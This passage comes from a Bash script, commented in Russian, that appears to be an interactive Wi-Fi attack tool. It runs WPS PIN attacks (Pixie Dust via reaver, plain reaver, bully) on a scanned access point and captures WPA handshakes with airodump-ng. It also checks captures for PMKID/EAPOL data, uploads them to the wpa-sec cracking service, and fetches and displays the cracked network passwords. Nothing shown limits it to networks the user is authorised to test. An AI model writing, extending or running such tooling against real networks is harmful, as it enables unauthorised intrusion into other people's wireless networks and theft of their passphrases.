            enter|num:*)
                case "$num" in
                    1) pmkid_upload_online "$cap" "$essid"; press_any ;;
                    2) pmkid_check_results; press_any ;;
                    3) pmkid_show_log; press_any ;;
                    4) return ;;
                esac ;;
        esac
    done
}

# ── curl к wpa-sec с прокси-fallback ──
# Возврат: 0 = ДОЗВОНИЛИСЬ (даже если тело пустое — просто нет данных);
#          1 = реальная сетевая ошибка (сервер недоступен).
# Тело ответа печатается в stdout (может быть пустым при успехе).
# У Shah прокси уже в окружении (https_proxy), curl берёт его сам — но на
# случай отсутствия пробуем ещё и явные схемы.
wpasec_curl() {
    command -v curl >/dev/null 2>&1 || return 1
    local out rc
    # этап 1 — как есть (curl сам подхватит http_proxy/https_proxy из окружения)
    out=$(curl -s --connect-timeout 8 --max-time 60 "$@" 2>/dev/null); rc=$?
    if [ $rc -eq 0 ]; then printf '%s' "$out"; return 0; fi   # дозвонились (тело может быть пустым)
    # этап 2 — окружение не помогло → пробуем явные схемы прокси
    local px; px=$(find_proxy)
    if [ -n "$px" ]; then
        local hostport="${px#http://}"; hostport="${hostport#https://}"; hostport="${hostport#socks5://}"; hostport="${hostport#socks5h://}"
        local scheme
        for scheme in "http://$hostport" "socks5h://$hostport"; do
            out=$(curl -s --connect-timeout 8 --max-time 60 --proxy "$scheme" "$@" 2>/dev/null); rc=$?
            if [ $rc -eq 0 ]; then printf '%s' "$out"; return 0; fi
        done
    fi
    return 1
}
# Для заливки — возвращает 0 при успешном дозвоне.
wpasec_curl_ok() {
    command -v curl >/dev/null 2>&1 || return 1
    curl -s --connect-timeout 8 --max-time 120 "$@" >/dev/null 2>&1 && return 0
    local px; px=$(find_proxy)
    if [ -n "$px" ]; then
        local hostport="${px#http://}"; hostport="${hostport#https://}"; hostport="${hostport#socks5://}"; hostport="${hostport#socks5h://}"
        local scheme
        for scheme in "http://$hostport" "socks5h://$hostport"; do
            curl -s --connect-timeout 8 --max-time 120 --proxy "$scheme" "$@" >/dev/null 2>&1 && return 0
        done
    fi
    return 1
}

# ── Проверка результата захвата handshake (airodump .cap) + яркое оповещение ──
# $1 = базовое имя (без -01.cap). Проверяет пойман ли handshake через aircrack-ng.
check_handshake_result() {
    local base="$1"
    # airodump пишет base-01.cap (или -02 при повторах) — берём свежий
    local cap; cap=$(ls -1t "${base}"*.cap 2>/dev/null | head -1)
    clear
    echo -e "${CYAN}${BOLD}========================================${NC}"
    echo -e "${CYAN}${BOLD}     $(t hs_result_t)     ${NC}"
    echo -e "${CYAN}${BOLD}========================================${NC}\n"
    if [ -z "$cap" ] || [ ! -s "$cap" ]; then
        echo -e "${RED}${BOLD}✖ $(t hs_no_cap)${NC}"
        return
    fi
    # aircrack-ng показывает "(1 handshake)" рядом с сетью если рукопожатие есть
    local info; info=$(aircrack-ng "$cap" 2>/dev/null)
    if printf '%s' "$info" | grep -qiE '\([1-9][0-9]* handshake'; then
        echo -e "${GREEN}${BOLD}✔✔✔  $(t hs_caught)  ✔✔✔${NC}\n"
        echo -e "${WHITE}$(t hs_file_at)${NC} ${CYAN}$cap${NC}"
        echo -e "${WHITE}$(t hs_next)${NC}"
        echo -e "  ${GREEN}$(t hs_next_crack)${NC}"
        echo -e "  ${GREEN}$(t hs_next_online)${NC}"
    else
        echo -e "${YELLOW}${BOLD}✖ $(t hs_not_caught)${NC}\n"
        echo -e "${WHITE}$(t hs_why)${NC}"
        echo -e "  ${YELLOW}• $(t hs_why1)${NC}"
        echo -e "  ${YELLOW}• $(t hs_why2)${NC}"
        echo -e "${WHITE}$(t hs_tip_deauth)${NC}"
    fi
}

# ── Анализ содержимого захвата (что внутри: PMKID / M1M2 / полный handshake) ──
# Через hcxpcapngtool (только читает, файл НЕ трогаем). Печатает сводку на экран
# и возвращает 0 если есть хоть что-то заливаемое (PMKID или EAPOL-пара), иначе 1.
analyze_capture() {
    local cap="$1"
    command -v hcxpcapngtool >/dev/null 2>&1 || return 0   # нет тула — не мешаем заливке
    local info; info=$(hcxpcapngtool -o /dev/null "$cap" 2>&1)
    # вытаскиваем метрики (строки вида "EAPOL M3 messages (total).....: N")
    local getval; getval(){ echo "$info" | grep -iE "$1" | grep -oP ':\s*\K[0-9]+' | head -1; }
    local m1 m2 m3 m4 pmkid pairs
    m1=$(getval 'EAPOL M1 messages'); m2=$(getval 'EAPOL M2 messages')
    m3=$(getval 'EAPOL M3 messages'); m4=$(getval 'EAPOL M4 messages')
    pmkid=$(getval 'PMKID.*written to 22000|written to 22000'); pairs=$(getval 'EAPOL pairs \(best\)|EAPOL pairs \(total\)')
    # RSN PMKID (total) — сколько PMKID вообще
    local pmkid_total; pmkid_total=$(getval 'RSN PMKID \(total\)|PMKID \(total\)')
    for v in m1 m2 m3 m4 pmkid pairs pmkid_total; do [ -z "${!v}" ] && eval "$v=0"; done

    echo -e "${CYAN}${BOLD}$(t an_title)${NC}"
    echo -e "${WHITE}------------------------------------${NC}"
    echo -e " ${WHITE}$(t an_pmkid)${NC} ${pmkid_total}"
    echo -e " ${WHITE}M1:${NC} $m1   ${WHITE}M2:${NC} $m2   ${WHITE}M3:${NC} $m3   ${WHITE}M4:${NC} $m4"
    echo -e "${WHITE}------------------------------------${NC}"

    # вердикт (полный handshake = есть M3; одна M4 без M3 пары не образует)
    if [ "$m3" -gt 0 ]; then
        echo -e " ${GREEN}${BOLD}$(t an_full)${NC}"        # есть M3 = полный handshake
        return 0
    elif [ "$pmkid_total" -gt 0 ] || { [ "$m1" -gt 0 ] && [ "$m2" -gt 0 ]; }; then
        echo -e " ${YELLOW}$(t an_pmkid_only)${NC}"        # только PMKID / M1M2
        return 0
    else
        echo -e " ${RED}$(t an_empty)${NC}"                # ничего заливаемого
        return 1
    fi
}

# Заливка файла на wpa-sec + запись в журнал.
# Формат по официальному upload-скрипту: POST на КОРЕНЬ https://wpa-sec.stanev.org
# с cookie key=<ключ> и multipart-полем file=@<pcapng>. НЕ /?submit.
pmkid_upload_online() {
    local cap="$1" essid="${2:-?}" key
    clear
    key=$(wpasec_get_key) || return
    # файл не передан (зашли из онлайн-меню напрямую) — выбираем
    if [ ! -f "$cap" ]; then
        local pf; pf=$(pmkid_pick_file) || return
        local hc; hc=$(pmkid_split_file "$pf")
        cap="${hc##*|}"; [ -f "$cap" ] || cap="${hc%%|*}"
    fi
    [ -f "$cap" ] || { echo -e "\n${RED}$(t pmk_nofile)${NC}"; return; }
    # только .pcapng — сервер принимает pcap-формат, не .22000
    case "$cap" in
        *.pcapng|*.pcap|*.cap) : ;;
        *) echo -e "\n${RED}$(t pmk_only_pcap)${NC}"; return ;;
    esac
    # ── Анализ содержимого перед заливкой (что реально внутри) ──
    echo ""
    analyze_capture "$cap"; local acode=$?
    if [ $acode -ne 0 ]; then
        # совсем ничего заливаемого — спросим, продолжать ли
        echo -e "\n${YELLOW}$(t an_ask_anyway)${NC}"
        echo -e "${WHITE}[Enter]${NC} $(t yes)   ${WHITE}[Esc/n]${NC} $(t no)"
        local k; IFS= read -rsn1 k
        case "$k" in n|N|т|Т|$'\e') return ;; esac
    fi
    echo -e "\n${YELLOW}$(t pmk_uploading)${NC}"
    local resp rc
    resp=$(wpasec_curl --cookie "key=$key" -F "file=@$cap" "https://wpa-sec.stanev.org"); rc=$?
    if [ $rc -ne 0 ]; then
        echo -e "${RED}$(t pmk_upfail)${NC}"
        echo -e "${YELLOW}$(t pmk_up_manual)${NC}"
    else
        # сервер ответил. Разбираем что именно (принято / уже было / ошибка).
        echo -e "${GREEN}$(t pmk_sent)${NC}"
        if [ -n "$resp" ]; then
            # показываем ответ сервера как есть (короткий текст: OK / already submitted / ...)
            local short; short=$(printf '%s' "$resp" | grep -viE '<|>|^$' | head -3)
            [ -n "$short" ] && echo -e "${WHITE}$(t pmk_srv_said)${NC} ${CYAN}${short}${NC}"
        fi
        echo -e "${YELLOW}$(t pmk_sent_note)${NC}"
        echo "$(date '+%Y-%m-%d %H:%M') | $essid | $(basename "$cap") | sent" >> "$WPASEC_LOG"
        fix_owner "$WPASEC_LOG"
    fi
    echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
    echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
}

# Проверить результаты онлайн (какие сети уже взломаны).
# Правильный эндпоинт (по офиц. скрипту): GET /?api&dl=1 с cookie key=<ключ>.
# Отдаёт potfile — только ВЗЛОМАННЫЕ: строки bssid:mac:essid:password.
pmkid_check_results() {
    local key
    clear
    key=$(wpasec_get_key) || return
    echo -e "\n${YELLOW}$(t pmk_checking)${NC}\n"
    local out rc
    out=$(wpasec_curl --cookie "key=$key" "https://wpa-sec.stanev.org/?api&dl=1"); rc=$?
    # rc≠0 — реальная сетевая ошибка (сервер недоступен)
    if [ $rc -ne 0 ]; then
        echo -e "${RED}$(t pmk_no_net)${NC}"
        echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
        echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
        return
    fi
    # дозвонились. Пустой ответ = взломанных сетей пока нет (всё в очереди).
    if [ -z "$out" ] || ! printf '%s' "$out" | grep -q ':'; then
        echo -e "${GREEN}$(t pmk_res_ok)${NC}"
        echo -e "${YELLOW}$(t pmk_res_none_cracked)${NC}"
        echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
        echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
        return
    fi
    # potfile-формат: bssid:mac_client:essid:password — все они ВЗЛОМАНЫ
    echo -e "${GREEN}${BOLD}$(t pmk_res_have)${NC}\n"
    local line essid pass
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        essid=$(printf '%s' "$line" | cut -d: -f3)
        pass=$(printf '%s' "$line" | cut -d: -f4-)
        [ -n "$essid$pass" ] && echo -e " ${GREEN}${BOLD}[$(t pmk_res_cracked)]${NC} ${essid}  →  ${GREEN}$pass${NC}"
    done <<< "$out"
    echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
    echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
}

# Показать журнал заливок (работает офлайн — читает файл)
pmkid_show_log() {
    clear
    echo -e "${CYAN}${BOLD}  $(t pmk_up_log)${NC}\n"
    if [ ! -s "$WPASEC_LOG" ]; then
        echo -e " ${YELLOW}$(t pmk_log_empty)${NC}"
        return
    fi
    echo -e " ${WHITE}$(t pmk_log_hdr)${NC}"
    echo -e "${CYAN}----------------------------------------${NC}"
    cat "$WPASEC_LOG"
    # ссылка (если ключ есть)
    if [ -f "$WPASEC_KEY_FILE" ]; then
        echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
        echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
    fi
}


scan_attack_menu() {
    local idx="$1"
    local b="${SCAN_BSSID[idx]}" ch="${SCAN_CH[idx]}" essid="${SCAN_ESSID[idx]}"
    # выставляем цель для существующих функций/сохранения
    TARGET_BSSID="$b"; TARGET_CHANNEL="$ch"
    local asel=0
    while true; do
        local options=(
            "${WHITE}|$(t atk_pixie)"
            "${WHITE}|$(t atk_reaver)"
            "${WHITE}|$(t atk_bully)"
            "${WHITE}|$(t atk_hs)"
            "${WHITE}|$(t atk_pmkid)"
            "${GREEN}|$(t atk_note)"
            "${RED}|$(t atk_cancel)"
        )
        clear
        echo -e "${CYAN}${BOLD}========================================${NC}"
        echo -e "${CYAN}${BOLD}      $(t atk_t)      ${NC}"
        echo -e "${CYAN}${BOLD}========================================${NC}"
        echo -e " ${YELLOW}ESSID:${NC} $essid"
        echo -e " ${YELLOW}BSSID:${NC} $b   ${YELLOW}Ch:${NC} $ch\n"
        local i
        for i in "${!options[@]}"; do
            local color="${options[i]%%|*}" text="${options[i]#*|}"
            if [ "$i" -eq "$asel" ]; then
                echo -e "${BG_SEL} $((i+1)) ${text} ${NC}"
            else
                echo -e "${color} $((i+1)) ${text}${NC}"
            fi
        done
        echo -e "\n${CYAN}$(t hint)${NC}"
        local key; key=$(read_key); local num="${key#num:}"
        [ "$key" = "enter" ] && num=$((asel+1))
        case "$key" in
            up)   ((asel>0)) && ((asel--)) ;;
            down) ((asel<${#options[@]}-1)) && ((asel++)) ;;
            esc)  return ;;
            enter|num:*)
                case "$num" in
                    1) local tag st; tag=$(sanitize_tag "$essid" "$b"); st=$(stamp_now)
                       RUN_LOG="$PIXIE_DIR/pixie_${tag}_${st}.log"
                       run_cmd "reaver -i $MON -b $b -c $ch -K -d 2 -t 5 -N -vv" ;;
                    2) local tag st; tag=$(sanitize_tag "$essid" "$b"); st=$(stamp_now)
                       RUN_LOG="$REAVER_DIR/reaver_${tag}_${st}.log"
                       run_cmd "reaver -i $MON -b $b -c $ch -d 2 -t 10 -N -vv" ;;
                    3) local B; if B=$(get_bully); then
                           local tag st; tag=$(sanitize_tag "$essid" "$b"); st=$(stamp_now)
                           RUN_LOG="$BULLY_DIR/bully_${tag}_${st}.log"
                           run_cmd "$B -b $b -c $ch -F -B $MON"
                       else echo -e "${RED}$(t err_bully)${NC}"; sleep 2; fi ;;
                    4) local tag st base; tag=$(sanitize_tag "$essid" "$b"); st=$(stamp_now)
                       base="$HS_DIR/handshake_${tag}_${st}"
                       run_cmd "airodump-ng -c $ch --bssid $b -w $base $MON"
                       fix_owner "$HS_DIR" "$base"* 2>/dev/null
                       check_handshake_result "$base"; press_any ;;
                    5) pmkid_pipeline "$b" "$ch" "$essid" ;;
                    6) db_upsert "$essid" "$b" "$ch" "" ""
                       echo -e "\n${GREEN}$(t h_saved)${NC}"; sleep 1 ;;
                    7) return ;;
                esac ;;
        esac
    done
}

menu_scan() {
